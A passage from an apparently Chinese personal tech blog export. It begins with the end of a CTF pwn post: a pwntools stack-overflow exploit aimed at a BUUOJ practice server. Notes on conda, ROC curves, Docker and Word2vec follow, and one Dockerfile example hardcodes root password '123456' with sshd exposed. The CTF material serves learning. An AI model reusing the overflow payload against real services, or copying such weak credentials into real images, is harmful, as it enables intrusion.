<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28082</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn1&#x27;) </span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span> + <span class="number">0x8</span>) + p64(<span class="number">0x0401185</span>) + p64(<span class="number">0x0401186</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p1) <span class="comment">#哈啊哈</span></span><br><span class="line"></span><br><span class="line">r.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="https://www.jianshu.com/p/755e52d48a77">checksec工具使用-pwn - 简书 (jianshu.com)</a></p>
<p>[(12条消息) <a href="https://blog.csdn.net/weixin_45004513/article/details/117332121">CTF PWN] 从0到0.00001 PWN入门超级详细_Csome-CSDN博客</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>conda使用</title>
    <url>/2022/07/02/conda%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<p>创建环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda create -n py2 python=2.7 //创建python2.7版本的环境，命名为py2</span><br></pre></td></tr></table></figure>
<p>查看已有的环境,</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda env list</span><br></pre></td></tr></table></figure>
<p>进入指定环境，进入环境后使用python和pip命令都是和该虚拟环境对应的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda activate &lt;env name&gt;</span><br></pre></td></tr></table></figure>
<p>退出环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda deactivate &lt;env name&gt;</span><br></pre></td></tr></table></figure>
<p>安装包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda install &lt;package name&gt;</span><br></pre></td></tr></table></figure>
<p>更新包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda update scipy</span><br></pre></td></tr></table></figure>
<p>显示所有已经安装的包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda install &lt;package name&gt;</span><br></pre></td></tr></table></figure>
<p>删除环境所有安装包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda remove -n &lt;env name&gt; --all   //所有的包</span><br><span class="line">conda remove/clean &lt;package name&gt;  //删除指定的包</span><br><span class="line">conda remove/clean -n pytorch1.2 tensorflow  //指定环境指定包</span><br></pre></td></tr></table></figure>
<p>更新</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda upgrade conda</span><br></pre></td></tr></table></figure>
<h1 id="pygpu使用">pygpu使用</h1>
<p>环境变量中需要加入conda对应虚拟环境的Librar/bin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">D:\Program Files\anaconda3\envs\pygpu\Library\<span class="built_in">bin</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>conda</tag>
      </tags>
  </entry>
  <entry>
    <title>ROC曲线</title>
    <url>/2022/07/02/ROC%E6%9B%B2%E7%BA%BF.html</url>
    <content><![CDATA[<h1 id="roc曲线">ROC曲线</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from sklearn.metrics import accuracy_score, classification_report,recall_score</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> roc_curve, auc</span><br></pre></td></tr></table></figure>
<p>注意实际的和预测的概率不能调换，而且要用score值，不能用0，1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fpr, tpr, thresholds = roc_curve(val_true, val_score)</span><br><span class="line">auc = auc(fpr, tpr)</span><br><span class="line">ax, =plt.plot(fpr, tpr, color=<span class="string">&#x27;darkorange&#x27;</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>], color=<span class="string">&#x27;navy&#x27;</span>, linestyle=<span class="string">&#x27;--&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;False Positive Rate&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True Positive Rate&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;ROC&#x27;</span>)</span><br><span class="line">plt.legend([ax],[<span class="string">&#x27;ROC curve (area = %0.2f)&#x27;</span> % auc])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><strong>深度学习中需要注意的一个问题：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">y_pred,event_pred = multi_model(batch_text0,batch_text1,batch_text2,batch_image)</span><br></pre></td></tr></table></figure>
<p>此时y_pred是batch_size * 2的tensor，2分别代表的是预测为0和1的概率</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">val_score.extend([b <span class="keyword">for</span> a,b <span class="keyword">in</span> y_pred.detach().cpu().numpy().tolist()])</span><br><span class="line">val_score.extend([<span class="built_in">max</span>(a,b) <span class="keyword">for</span> a,b <span class="keyword">in</span> y_pred.detach().cpu().numpy().tolist()])</span><br></pre></td></tr></table></figure>
<p>我们要的是预测为1的概率，这里要用b，不能用max或者a</p>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>deep_learning</tag>
      </tags>
  </entry>
  <entry>
    <title>docker使用</title>
    <url>/2022/07/02/docker%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<figure>
<img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702231619706-231917926.jpg" alt="查看源图像" /><figcaption aria-hidden="true">查看源图像</figcaption>
</figure>
<h2 id="清除所有容器和镜像">清除所有容器和镜像</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -aq)   <span class="comment">#停止所有容器</span></span><br><span class="line">docker rm $(docker ps -aq)     <span class="comment">#删除已经停止的容器</span></span><br><span class="line">docker <span class="built_in">kill</span> $(docker ps -a -q) <span class="comment">#删除所有正在运行的容器</span></span><br><span class="line">docker rmi $(docker images -q) <span class="comment">#删除所有镜像</span></span><br></pre></td></tr></table></figure>
<p>ERROR: Pool overlaps with other one on this address space</p>
<p><a href="https://blog.csdn.net/The_Time_Runner/article/details/105210260">(32条消息) (20200328已解决)ERROR: Pool overlaps with other one on this address space_漫步量化-CSDN博客</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network ls <span class="comment"># 查看docker网卡</span></span><br><span class="line">docker network inspect &lt;网卡id&gt; <span class="comment"># 查看具体信息，找到与subnet冲突的是哪个</span></span><br><span class="line">docker network rm &lt;网卡id&gt; <span class="comment"># 删除冲突的网卡</span></span><br></pre></td></tr></table></figure>
<h1 id="创建镜像和容器">创建镜像和容器</h1>
<p>拉取镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull image_name  //后面run之前没有pull的话会自动pull</span><br><span class="line">当运行容器时，使用的镜像如果在本地中不存在，docker 就会自动从 docker 镜像仓库中下载，默认是从 Docker Hub 公共镜像源下载。</span><br></pre></td></tr></table></figure>
<p>创建模式：交互式和后台式，-it也可以 cat /proc/version查看系统版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -i -t ubuntu:15.10 /bin/bash</span><br><span class="line">docker run -d ubuntu:15.10 /bin/sh -c <span class="string">&quot;while true; do echo hello world; sleep 1; done&quot;</span></span><br><span class="line">docker run -itd --name ubuntu-test ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>-t:</strong> 在新容器内指定一个伪终端或终端。</li>
<li><strong>-i:</strong> 允许你对容器内的标准输入 (STDIN) 进行交互。</li>
<li><strong>-d:</strong>让容器在后台运行。</li>
<li><strong>-P:*<em>将容器内部使用的网络端口*</em>随机映射</strong>到我们使用的主机上。</li>
<li><strong>-p :</strong> 是容器内部端口绑定到<strong>指定</strong>的主机端口。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORTS     //使用-P会将容器的端口映射到主机</span><br><span class="line">0.0.0.0:32769-&gt;5000/tcp</span><br><span class="line">docker run -d -p 5000:5000 training/webapp python app.py</span><br><span class="line">可以自己定义，否则会随机映射</span><br><span class="line">docker run -d -p 127.0.0.1:5001:5000 training/webapp python app.py</span><br><span class="line">可以指定本机的IP网络地址通过访问 127.0.0.1:5001 来访问容器的 5000 端口。</span><br><span class="line">默认都是绑定 tcp 端口，如果要绑定 UDP 端口，可以在端口后面加上 ：5000/udp</span><br></pre></td></tr></table></figure>
<p>查看后台容器的输出log</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker logs container_id</span><br><span class="line">docker stats --<span class="built_in">help</span>  //查看帮助</span><br><span class="line">docker start/restart/stop container_id</span><br><span class="line">docker attach container_id 进入容器交互，但是退出会导致容器关闭</span><br><span class="line">docker <span class="built_in">exec</span> -it 243c32535da7 /bin/bash</span><br></pre></td></tr></table></figure>
<h1 id="导入导出">导入导出</h1>
<p>导出容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">export</span> 1e560fca3906 &gt; ubuntu.tar</span><br></pre></td></tr></table></figure>
<p>导入，将文件变为镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat docker/ubuntu.tar | docker import - <span class="built_in">test</span>/ubuntu:v1</span><br></pre></td></tr></table></figure>
<p>也可以通过url来导入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker import http://example.com/exampleimage.tgz example/imagerepo</span><br></pre></td></tr></table></figure>
<h1 id="删除容器">删除容器</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rm -f  container_id/container_name 仅能删除stop的容器</span><br></pre></td></tr></table></figure>
<h1 id="查看端口映射">查看端口映射</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker port container_id/container_name</span><br><span class="line">docker run可以通过--name指定名称</span><br><span class="line">docker port adoring_stonebraker 5000 返回该容器映射到主机的哪个端口</span><br></pre></td></tr></table></figure>
<h1 id="查看容器内的进程">查看容器内的进程</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker top container_id/container_name</span><br><span class="line">UID     PID         PPID          ...       TIME                CMD</span><br><span class="line">root    23245       23228         ...       00:00:00            python app.py</span><br></pre></td></tr></table></figure>
<h1 id="自动创建镜像">自动创建镜像</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images  查看所有镜像</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br></pre></td></tr></table></figure>
<p>同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，如 ubuntu 仓库源里，有 15.10、14.04 等多个不同的版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -t -i ubuntu:15.10 /bin/bash </span><br><span class="line"> docker search image_name  在docker hub中查找镜像</span><br><span class="line"> NAME: 镜像仓库源的名称</span><br><span class="line"></span><br><span class="line">DESCRIPTION: 镜像的描述</span><br><span class="line"></span><br><span class="line">OFFICIAL: 是否 docker 官方发布</span><br><span class="line"></span><br><span class="line">stars: 类似 Github 里面的 star，表示点赞、喜欢的意思。</span><br><span class="line"></span><br><span class="line">AUTOMATED: 自动构建。</span><br></pre></td></tr></table></figure>
<h1 id="创建个人镜像">创建个人镜像</h1>
<ul>
<li>1、从已经创建的容器中更新镜像，并且提交这个镜像</li>
<li>2、使用 Dockerfile 指令来创建一个新的镜像</li>
</ul>
<p>修改镜像并提交</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -t -i ubuntu:15.10 /bin/bash</span><br><span class="line">apt-get update </span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">docker commit -m=<span class="string">&quot;has update&quot;</span> -a=<span class="string">&quot;runoob&quot;</span> e218edb10161 runoob/ubuntu:v2</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>-m:</strong> 提交的描述信息</li>
<li><strong>-a:</strong> 指定镜像作者</li>
<li><strong>e218edb10161：</strong>容器 ID</li>
<li><strong>runoob/ubuntu:v2:</strong> 指定要创建的目标镜像名</li>
</ul>
<p>从零开始docker build先需要一个Dockerfile文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM    centos:6.7</span><br><span class="line">MAINTAINER      Fisher <span class="string">&quot;fisher@sudops.com&quot;</span></span><br><span class="line"></span><br><span class="line">RUN     /bin/<span class="built_in">echo</span> <span class="string">&#x27;root:123456&#x27;</span> |chpasswd</span><br><span class="line">RUN     useradd runoob</span><br><span class="line">RUN     /bin/<span class="built_in">echo</span> <span class="string">&#x27;runoob:123456&#x27;</span> |chpasswd</span><br><span class="line">RUN     /bin/<span class="built_in">echo</span> -e <span class="string">&quot;LANG=\&quot;en_US.UTF-8\&quot;&quot;</span> &gt;/etc/default/<span class="built_in">local</span></span><br><span class="line">EXPOSE  22</span><br><span class="line">EXPOSE  80</span><br><span class="line">CMD     /usr/sbin/sshd -D</span><br><span class="line">docker build -t runoob/centos:6.7 .  </span><br><span class="line">docker build -t 镜像名：tag  Dockerfile路径  //这里可以自己定义镜像的名称和tag</span><br></pre></td></tr></table></figure>
<h1 id="给镜像添加标签">给镜像添加标签</h1>
<p>这里指定镜像ID，添加了一个dev标签</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag 860c279d2fec runoob/centos:dev</span><br></pre></td></tr></table></figure>
<h1 id="容器连接网络">容器连接网络</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 127.0.0.1:5001:5000 training/webapp python app.py</span><br><span class="line">可以指定宿主机的IP端口到容器的端口</span><br><span class="line">docker port adoring_stonebraker 5000   //查看容器5000端口映射到主机的哪个IP和端口</span><br></pre></td></tr></table></figure>
<p>创建网络</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network create -d bridge test-net</span><br></pre></td></tr></table></figure>
<p><strong>-d</strong>：参数指定 Docker 网络类型，有 bridge、overlay。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -itd --name test1 --network test-net ubuntu /bin/bash</span><br><span class="line">将名称为test1的容器加入到网络中</span><br><span class="line">添加多个容器后可以互相ping， ping+容器名</span><br></pre></td></tr></table></figure>
<h1 id="配置dns">配置DNS</h1>
<p>宿主机设置 /etc/docker/daemon.json ，然后重启docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;dns&quot;</span> : [</span><br><span class="line">    <span class="string">&quot;114.114.114.114&quot;</span>,</span><br><span class="line">    <span class="string">&quot;8.8.8.8&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">docker run -it --rm  ubuntu  cat etc/resolv.conf //查看容器的DNS配置</span><br><span class="line">docker run -it --rm -h host_ubuntu  --dns=114.114.114.114 --dns-search=test.com ubuntu</span><br><span class="line">手动给容器指定DNS</span><br><span class="line">如果在容器启动时没有指定 --dns 和 --dns-search，Docker 会默认用宿主主机上的 /etc/resolv.conf 来配置容器的 DNS。</span><br></pre></td></tr></table></figure>
<p><strong>--rm</strong>：容器退出时自动清理容器内部的文件系统。</p>
<p><strong>-h HOSTNAME 或者 --hostname=HOSTNAME</strong>： 设定容器的主机名，它会被写到容器内的 /etc/hostname 和 /etc/hosts。</p>
<p><strong>--dns=IP_ADDRESS</strong>： 添加 DNS 服务器到容器的 /etc/resolv.conf 中，让容器用这个服务器来解析所有不在 /etc/hosts 中的主机名。</p>
<p><strong>--dns-search=DOMAIN</strong>： 设定容器的搜索域，当设定搜索域为 .example.com 时，在搜索一个名为 host 的主机时，DNS 不仅搜索 host，还会搜索 <a href="http://host.example.com">host.example.com</a>。</p>
<h1 id="仓库管理">仓库管理</h1>
<p>登录和登出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker login</span><br><span class="line">docker <span class="built_in">logout</span></span><br></pre></td></tr></table></figure>
<p>查看和拉取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search ubuntu</span><br><span class="line">docker pull</span><br></pre></td></tr></table></figure>
<p>推送自己的镜像到dockerhub</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag ubuntu:18.04 username/ubuntu:18.04</span><br><span class="line">docker push username/ubuntu:18.04</span><br><span class="line">docker search username/ubuntu</span><br></pre></td></tr></table></figure>
<h1 id="dockerfile">Dockerfile</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos     //镜像名称</span><br><span class="line">RUN yum -y install wget \</span><br><span class="line">    &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span><br><span class="line">    &amp;&amp; tar -xvf redis.tar.gz   //如不使用 &amp;&amp;会创建多层docker</span><br><span class="line">Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。</span><br></pre></td></tr></table></figure>
<p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p>
<p><strong>RUN</strong>：用于执行后面跟着的命令行命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RUN &lt;命令行命令&gt;</span><br><span class="line"><span class="comment"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span></span><br><span class="line">RUN [<span class="string">&quot;可执行文件&quot;</span>, <span class="string">&quot;参数1&quot;</span>, <span class="string">&quot;参数2&quot;</span>]</span><br><span class="line"><span class="comment"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span></span><br></pre></td></tr></table></figure>
<p>build</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v3 .</span><br><span class="line">-t指定镜像的名称和tag，点是dockerfile的路径</span><br></pre></td></tr></table></figure>
<p>指令最后一个 . 是上下文路径，上下文路径，是指 docker 在构建镜像，有时候<strong>想要使用到本机的文件</strong>（比如复制），docker build 命令得知这个路径后，会将<strong>路径下的所有内容打包</strong>。</p>
<p>由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候<strong>无法用到我们本机的文件</strong>。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。</p>
<p>常用指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">COPY: 从上下文目录中复制文件或者目录到容器里指定路径  源文件或者源目录，这里可以是通配符表达式</span><br><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;</span><br><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] [<span class="string">&quot;&lt;源路径1&gt;&quot;</span>,...  <span class="string">&quot;&lt;目标路径&gt;&quot;</span>]</span><br><span class="line">COPY hom* /mydir/</span><br><span class="line">COPY hom?.txt /mydir/</span><br><span class="line">CMD: docker run时运行，RUN指令是在docker build时运行的</span><br><span class="line">为启动的容器指定默认要运行的程序，**程序运行结束，容器也就结束**。</span><br><span class="line">如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</span><br><span class="line">CMD &lt;shell 命令&gt; </span><br><span class="line">CMD [<span class="string">&quot;&lt;可执行文件或命令&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...] </span><br><span class="line">CMD [<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]  <span class="comment"># 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></span><br><span class="line">ENV:设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</span><br><span class="line">ENV &lt;key&gt; &lt;value&gt;</span><br><span class="line">ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</span><br><span class="line">ENV NODE_VERSION 7.2.0</span><br><span class="line"></span><br><span class="line">RUN curl -SLO <span class="string">&quot;https://nodejs.org/dist/v<span class="variable">$NODE_VERSION</span>/node-v<span class="variable">$NODE_VERSION</span>-linux-x64.tar.xz&quot;</span> \</span><br><span class="line">  &amp;&amp; curl -SLO <span class="string">&quot;https://nodejs.org/dist/v<span class="variable">$NODE_VERSION</span>/SHASUMS256.txt.asc&quot;</span></span><br><span class="line">ARG:构建参数，与 ENV 作用一致。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</span><br><span class="line">ARG &lt;参数名&gt;[=&lt;默认值&gt;]</span><br><span class="line">构建命令 docker build 中可以用 --build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</span><br></pre></td></tr></table></figure>
<h1 id="docker-compose">Docker Compose</h1>
<p>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>
<p><a href="https://www.runoob.com/w3cnote/yaml-intro.html">YAML 入门教程 | 菜鸟教程 (runoob.com)</a></p>
<ul>
<li>使用 Dockerfile 定义应用程序的环境。</li>
<li>使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行。</li>
<li>最后，执行 docker-compose up 命令来启动并运行整个应用程序。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d后台运行</span><br></pre></td></tr></table></figure>
<h1 id="参考">参考</h1>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Word2vec</title>
    <url>/2021/10/17/word2vec.html</url>
    <content><![CDATA[<figure>
<img src="https://img2022.cnblogs.com/blog/2348945/202206/2348945-20220630094304313-1930423377.png" alt="查看源图像" /><figcaption aria-hidden="true">查看源图像</figcaption>
</figure>
<p>Word2Vec是语言模型中的一种，它是从大量文本预料中以无监督方式学习语义知识的模型，被广泛地应用于自然语言处理中。</p>
<p>Word2Vec是用来生成词向量的工具，而词向量与语言模型有着密切的关系。</p>
<span id="more"></span>
<meta name="referrer" content="no-referrer"/>
<h2 id="基础概念">基础概念</h2>
<h3 id="语料">语料</h3>
<p>看word2vec之前可以先看<a href="https://www.cnblogs.com/dddddblog/p/n_gram.html">n-gram模型</a></p>
<p>word2vec是一个统计语言模型，通过计算条件概率来预测和生成向量。</p>
<p>n-gram模型在语料库足够大的情况下，不单独统计各个条件概率，而是直接使用这种大概的方式，减少计算</p>
<p>​ <span class="math display">\[p(w_k|w_{k-n+1},...,w_{k-1}) = \frac{count(w_{k-n},...,w_k)}{count(w_{k-n+1},...w_{k-1})}\]</span></p>
<p>参数n（word2vec中的窗口大小）确定需要根据模型参数的数量来确定。一般来说越大越好，后面效果增加减少。</p>
<p>对于统计语言模型而言，利用最大似然，可把目标函数设为：</p>
<p><img src="https://www.zhihu.com/equation?tex=+%5Cprod_%7Bw+%5Cin+C%7D%5E%7B%7D+p%28w%7CContext%28w%29%29+%5C%5C" alt="[公式]" /> 其中，C表示语料(Corpus)，Context(w)表示词w的上下文，即w周边的词的集合。当Context(w)为空时，就取 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29%3D+p%28w%29" alt="[公式]" /> 。特别地，对于前面介绍的n-gram模型，就有 <img src="https://www.zhihu.com/equation?tex=Context%28w_%7Bi%7D+%3D+w_%7Bi-n%2B1%7D%2C...%2Cw_%7Bi-1%7D%29" alt="[公式]" /> 。</p>
<h3 id="模型基础">模型基础</h3>
<p>当然，实际应用中常采用最大对数似然，即把目标函数设为</p>
<p><img src="https://www.zhihu.com/equation?tex=L+%3D+%5Csum_%7Bw+%5Cin+C%7D%5E%7B%7D%7Blog+p%28w%7CContext%28w%29%29%7D++%5Ctag%7B4%7D%5C%5C" alt="[公式]" /> 然后对这个函数进行最大化。</p>
<p>从公式（4）可见，概率 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29" alt="[公式]" /> 已被视为关于w和Context(w)的函数，即：</p>
<p><img src="https://www.zhihu.com/equation?tex=+p%28w%7CContext%28w%29%29+%3D+F%28w%2C+Context%28w%29%2C+%5Ctheta%29+%5C%5C" alt="[公式]" /> 其中 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 为待定参数集。这样一来，一旦对（4）进行优化得到最优参数集 <img src="https://www.zhihu.com/equation?tex=%5Ctheta%5E%7B+%2A%7D" alt="[公式]" /> 后，F也就唯一被确定了，以后任何概率p(w|Context(w))就可以通过函数 <img src="https://www.zhihu.com/equation?tex=F%28w%2C+Context%28w%29%2C+%5Ctheta%5E%7B+%2A%7D%29" alt="[公式]" /> 来计算了。与n-gram相比，这种方法不需要事先计算并保存所有的概率值，而是通过直接计算来获取，且通选取合适的模型可使得 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 中参数的个数远小于n-gram中模型参数的个数。</p>
<h2 id="word2vec网络结构">word2vec网络结构</h2>
<p>word2vec是轻量级的神经网络，其模型仅仅包括输入层、隐藏层和输出层，分为CBOW和Skip-gram模型。CBOW是知道上下文语料的情况下，预测当前的词。skip-gram则是根据一个词预测上下文。上下文是指根据window_size设置的前后各n个词。</p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211013225352657-2105331470.png" /></p>
<h3 id="cbow模型">CBOW模型</h3>
<p><img src="https://pic3.zhimg.com/80/v2-55eadeeae1fb93907d9b3da9aabed576_720w.jpg" /></p>
<h3 id="skip-gram模型">skip-gram模型</h3>
<p><img src="https://pic4.zhimg.com/80/v2-3baa8ea48cf7028510871a2894ffbb97_720w.jpg" /></p>
<h2 id="word2vec实践">word2vec实践</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torch.autograd <span class="keyword">as</span> autograd</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CONTEXT_SIZE = <span class="number">2</span>  <span class="comment"># 2 words to the left, 2 to the right</span></span><br><span class="line">raw_text = <span class="string">&quot;&quot;&quot;We are about to study the idea of a computational process.</span></span><br><span class="line"><span class="string">Computational processes are abstract beings that inhabit computers.</span></span><br><span class="line"><span class="string">As they evolve, processes manipulate other abstract things called data.</span></span><br><span class="line"><span class="string">The evolution of a process is directed by a pattern of rules</span></span><br><span class="line"><span class="string">called a program. People create programs to direct processes. In effect,</span></span><br><span class="line"><span class="string">we conjure the spirits of the computer with our spells.&quot;&quot;&quot;</span>.split()</span><br><span class="line"></span><br><span class="line"><span class="comment"># By deriving a set from `raw_text`, we deduplicate the array</span></span><br><span class="line">vocab = <span class="built_in">set</span>(raw_text)</span><br><span class="line">vocab_size = <span class="built_in">len</span>(vocab)</span><br><span class="line"></span><br><span class="line">word_to_ix = &#123;word: i <span class="keyword">for</span> i, word <span class="keyword">in</span> <span class="built_in">enumerate</span>(vocab)&#125;</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(raw_text) - <span class="number">2</span>):</span><br><span class="line">    context = [raw_text[i - <span class="number">2</span>], raw_text[i - <span class="number">1</span>],</span><br><span class="line">               raw_text[i + <span class="number">1</span>], raw_text[i + <span class="number">2</span>]]</span><br><span class="line">    target = raw_text[i]</span><br><span class="line">    data.append((context, target))</span><br><span class="line"><span class="built_in">print</span>(data[:<span class="number">5</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBOW</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, vocab_size, embedding_dim, context_size</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(CBOW, self).__init__()</span><br><span class="line">        self.embeddings = nn.Embedding(vocab_size, embedding_dim)</span><br><span class="line">        self.linear1 = nn.Linear(context_size * embedding_dim, <span class="number">128</span>)</span><br><span class="line">        self.linear2 = nn.Linear(<span class="number">128</span>, vocab_size)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, inputs</span>):</span></span><br><span class="line">        embeds = self.embeddings(inputs).view((<span class="number">1</span>, -<span class="number">1</span>))</span><br><span class="line">        out = F.relu(self.linear1(embeds))</span><br><span class="line">        out = self.linear2(out)</span><br><span class="line">        log_probs = F.log_softmax(out, dim=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>(log_probs)</span><br></pre></td></tr></table></figure>
